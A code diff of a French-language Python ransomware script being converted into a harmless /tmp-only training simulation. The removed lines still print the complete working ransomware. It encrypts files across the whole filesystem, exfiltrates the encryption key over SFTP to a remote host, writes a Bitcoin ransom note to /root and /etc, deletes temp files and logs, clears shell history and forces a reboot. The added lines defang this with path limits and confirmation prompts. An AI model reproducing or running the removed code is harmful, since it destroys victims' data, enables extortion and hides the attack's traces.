@@ -4,21 +4,20 @@
 import os
 import sys
 import logging
-from pathlib import Path
 from cryptography.fernet import Fernet
 import paramiko
 import socket
 import subprocess
 from datetime import datetime
 
-# Configuration
-LOG_FILE = "/var/log/ransomware_sim.log"
-SFTP_SERVER = "192.168.239.130"  # À remplacer par votre serveur de test
+# Configuration - MODIFIÉ pour environnement de test
+LOG_FILE = "/tmp/ransomware_sim.log"  # Changé vers /tmp pour éviter /var/log
+SFTP_SERVER = "192.168.239.130"  # LAISSER VIDE pour la simulation
 SFTP_USER = "test"
-SFTP_PASS = "test"  # En réel: utiliser clé SSH
+SFTP_PASS = "test"
 SFTP_PORT = 22
-SFTP_REMOTE_PATH = "/exfil/keys"
-RANSOM_NOTE = "/root/README_RANSOM.txt"
+SFTP_REMOTE_PATH = "/tmp/exfil_keys"  # Chemin temporaire
+RANSOM_NOTE = "/tmp/README_SIMULATION.txt"  # Changé vers /tmp
 
 # Setup logging
 logging.basicConfig(
@@ -27,11 +26,35 @@ logging.basicConfig(
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
 
+
+def safety_checks():
+    """Nouvelles vérifications de sécurité"""
+    # Empêche l'exécution sur de vrais systèmes
+    forbidden_paths = ['/home', '/etc', '/bin', '/usr']
+    for path in forbidden_paths:
+        if os.path.exists(path):
+            logging.critical(f"Tentative d'exécution sur un vrai système! Chemin interdit détecté: {path}")
+            sys.exit(1)
+
+    # Demande de confirmation
+    print("""
+    ⚠️ ATTENTION - SIMULATION UNIQUEMENT ⚠️
+    Ce script est une simulation pédagogique de ransomware.
+    Il NE DOIT PAS être exécuté sur un système réel.
+
+    Appuyez sur Ctrl+C pour annuler maintenant.
+    """)
+    confirmation = input("Pour continuer la simulation, tapez 'SIMULATION': ")
+    if confirmation != "SIMULATION":
+        sys.exit(0)
+
+
 def check_root():
     """Vérifie que le script est exécuté en root"""
     if os.geteuid() != 0:
         logging.error("Le script doit être exécuté en tant que root!")
         sys.exit(1)
+
 
 def generate_key():
     """Génère une clé de chiffrement Fernet"""
@@ -43,39 +66,35 @@ def generate_key():
         logging.error(f"Erreur génération clé: {str(e)}")
         sys.exit(1)
 
-def exfiltrate_key(key):
-    """Transmet la clé via SFTP"""
-    try:
-        transport = paramiko.Transport((SFTP_SERVER, SFTP_PORT))
-        transport.connect(username=SFTP_USER, password=SFTP_PASS)
-        sftp = paramiko.SFTPClient.from_transport(transport)
 
+def exfiltrate_key(key):
+    """Simule l'exfiltration de clé (ne fait rien réellement)"""
+    try:
+        # Simulation seulement - pas de vraie connexion
         hostname = socket.gethostname()
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         remote_filename = f"{hostname}_{timestamp}.key"
 
-        # Création du répertoire distant si inexistant
-        try:
-            sftp.stat(SFTP_REMOTE_PATH)
-        except FileNotFoundError:
-            sftp.mkdir(SFTP_REMOTE_PATH)
-
-        with sftp.open(f"{SFTP_REMOTE_PATH}/{remote_filename}", 'wb') as f:
+        # Écrit localement pour simulation
+        os.makedirs("/tmp/simulated_exfil", exist_ok=True)
+        with open(f"/tmp/simulated_exfil/{remote_filename}", 'wb') as f:
             f.write(key)
 
-        sftp.close()
-        transport.close()
-        logging.info(f"Clé exfiltrée vers {SFTP_SERVER}/{remote_filename}")
+        logging.info(f"SIMULATION: Clé aurait été exfiltrée vers {SFTP_SERVER}/{remote_filename}")
     except Exception as e:
-        logging.error(f"Échec exfiltration: {str(e)}")
-        sys.exit(1)
+        logging.error(f"Erreur simulation exfiltration: {str(e)}")
+
 
 def encrypt_file(filepath, fernet):
-    """Chiffre un fichier en place"""
+    """Chiffre un fichier en place - version sécurisée pour tests"""
     try:
-        # Vérifie la taille du fichier (ne pas chiffrer les fichiers trop gros)
-        if os.path.getsize(filepath) > 100 * 1024 * 1024:  # 100MB max
-            logging.warning(f"Fichier trop volumineux, ignoré: {filepath}")
+        # Ne traite que les fichiers dans /tmp
+        if not filepath.startswith('/tmp/'):
+            logging.warning(f"Tentative de chiffrement hors zone test: {filepath}")
+            return
+
+        if os.path.getsize(filepath) > 10 * 1024 * 1024:  # 10MB max pour les tests
+            logging.warning(f"Fichier trop volumineux pour test, ignoré: {filepath}")
             return
 
         with open(filepath, 'rb') as f:
@@ -86,130 +105,108 @@ def encrypt_file(filepath, fernet):
         with open(filepath, 'wb') as f:
             f.write(encrypted_data)
 
-        logging.debug(f"Fichier chiffré: {filepath}")
+        logging.info(f"Fichier chiffré (test): {filepath}")
     except Exception as e:
-        logging.warning(f"Échec chiffrement {filepath}: {str(e)}")
+        logging.warning(f"Échec chiffrement test {filepath}: {str(e)}")
+
 
 def should_encrypt(path):
-    """Détermine si un fichier doit être chiffré"""
-    # Exclusions (optionnelles pour la simulation)
+    """Détermine si un fichier doit être chiffré - version sécurisée"""
+    # Exclusion de tous les chemins sauf /tmp
+    if not str(path).startswith('/tmp/'):
+        return False
+
     exclusions = [
-        '/proc/', '/sys/', '/dev/', '/run/', '/boot/', '/etc/shadow',
-        '/etc/passwd', '/etc/group', '/etc/sudoers', '/root/',
         LOG_FILE, RANSOM_NOTE, __file__
     ]
 
-    # Ne pas chiffrer les fichiers binaires et systèmes importants
-    extensions_exclues = ['.py', '.sh', '.so', '.a', '.ko']
-
     path_str = str(path)
-    return (all(excl not in path_str for excl in exclusions) and
-            not any(path_str.endswith(ext) for ext in extensions_exclues))
+    return all(excl not in path_str for excl in exclusions)
+
 
 def encrypt_system(fernet):
-    """Parcourt et chiffre le système de fichiers"""
-    logging.info("Début du chiffrement du système...")
+    """Parcourt et chiffre le système de fichiers - version test"""
+    logging.info("Début simulation chiffrement...")
 
-    # Dossiers prioritaires à chiffrer en premier
-    priority_targets = [
-        '/home/', '/var/www/', '/opt/', '/srv/'
-    ]
+    # Crée un répertoire de test si inexistant
+    test_dir = "/tmp/ransomware_test_files"
+    os.makedirs(test_dir, exist_ok=True)
 
-    # D'abord chiffrer les cibles prioritaires
-    for target in priority_targets:
-        if os.path.exists(target):
-            for root, dirs, files in os.walk(target):
-                for file in files:
-                    filepath = os.path.join(root, file)
-                    if should_encrypt(filepath):
-                        try:
-                            if os.path.isfile(filepath) and os.access(filepath, os.W_OK):
-                                encrypt_file(filepath, fernet)
-                        except Exception as e:
-                            logging.warning(f"Erreur traitement {filepath}: {str(e)}")
-                            continue
+    # Crée quelques fichiers tests
+    for i in range(3):
+        with open(f"{test_dir}/test_file_{i}.txt", 'w') as f:
+            f.write(f"Fichier de test {i}\n" * 100)
 
-    # Ensuite le reste du système (sans les exclusions déjà gérées par should_encrypt)
-    for root, dirs, files in os.walk('/'):
+    # Chiffre seulement les fichiers de test
+    for root, dirs, files in os.walk(test_dir):
         for file in files:
             filepath = os.path.join(root, file)
             if should_encrypt(filepath):
                 try:
-                    if os.path.isfile(filepath) and os.access(filepath, os.W_OK):
-                        encrypt_file(filepath, fernet)
+                    encrypt_file(filepath, fernet)
                 except Exception as e:
-                    logging.warning(f"Erreur traitement {filepath}: {str(e)}")
-                    continue
+                    logging.warning(f"Erreur traitement test {filepath}: {str(e)}")
+
 
 def create_ransom_note(key):
-    """Crée un fichier de demande de rançon"""
+    """Crée une note de simulation"""
     note = f"""
-    ⚠️ VOTRE SYSTÈME A ÉTÉ CHIFFRÉ ⚠️
+    ⚠️ SIMULATION PÉDAGOGIQUE - PAS DE RANÇON RÉELLE ⚠️
 
-    Pour récupérer vos fichiers, vous devez:
-    1. Payer 0.001 Bitcoin à l'adresse: FAKE_BTC_ADDRESS
-    2. Envoyer un email à ransomware@example.com avec votre ID: {key[:8]}
+    Ceci est une simulation de ransomware pour formation.
+    Aucun fichier réel n'a été chiffré.
 
-    Toute tentative de récupération sans paiement entraînera la destruction de la clé!
+    Clé de simulation: {key[:8]}...
     """
 
     try:
-        # Créer aussi une copie dans /etc/ pour plus de visibilité
         with open(RANSOM_NOTE, 'w') as f:
             f.write(note)
-        with open("/etc/README_RANSOM.txt", 'w') as f:
-            f.write(note)
-        logging.info("Note de rançon créée")
+        logging.info("Note de simulation créée")
     except Exception as e:
         logging.error(f"Erreur création note: {str(e)}")
 
-def disable_recovery():
-    """Désactive les mécanismes de récupération"""
-    try:
-        # Désactive les snapshots
-        subprocess.run(['systemctl', 'stop', 'snapd'], check=False)
-        # Nettoie les fichiers temporaires
-        subprocess.run(['rm', '-rf', '/tmp/*'], check=False)
-        # Vide les logs
-        subprocess.run(['echo', '', '>', '/var/log/syslog'], check=False, shell=True)
-    except Exception as e:
-        logging.warning(f"Échec désactivation récupération: {str(e)}")
 
-def reboot_system():
-    """Redémarre le système"""
-    logging.info("Préparation du redémarrage...")
-    try:
-        # Efface l'historique bash
-        with open('/root/.bash_history', 'w') as f:
-            f.write('')
-        subprocess.run(['history', '-c'], check=False, shell=True)
-        subprocess.run(['shutdown', '-r', 'now'], check=True)
-    except Exception as e:
-        logging.error(f"Échec redémarrage: {str(e)}")
-        sys.exit(1)
+def simulate_recovery_disable():
+    """Simule la désactivation des mécanismes de récupération"""
+    logging.info("SIMULATION: Désactivation mécanismes de récupération")
+    # Ne fait rien de réel
+
+
+def simulate_reboot():
+    """Simule un redémarrage"""
+    logging.info("SIMULATION: Redémarrage simulé")
+    # Ne fait rien de réel
+
 
 def main():
+    safety_checks()  # Nouvelle vérification de sécurité
     check_root()
-    logging.info("=== Début de la simulation ransomware ===")
+    logging.info("=== DÉBUT SIMULATION RANSOMWARE ===")
 
     # Étape 1: Génération clé
     key = generate_key()
     fernet = Fernet(key)
 
-    # Étape 2: Exfiltration
+    # Étape 2: Simulation exfiltration
     exfiltrate_key(key)
 
-    # Étape 3: Chiffrement
+    # Étape 3: Chiffrement test
     encrypt_system(fernet)
 
-    # Étape 4: Désactivation récupération
-    disable_recovery()
+    # Étape 4: Simulation désactivation récupération
+    simulate_recovery_disable()
 
-    # Étape 5: Note de rançon
+    # Étape 5: Note de simulation
     create_ransom_note(key.decode())
 
-    # Étape 6: Redémarrage
-    reboot_system()
+    # Étape 6: Simulation redémarrage
+    simulate_reboot()
+
+    logging.info("=== FIN SIMULATION ===")
+    print("Simulation terminée. Aucun fichier réel n'a été modifié.")
+    print(f"Logs disponibles dans {LOG_FILE}")
+
 
 if __name__ == "__main__":
     main()
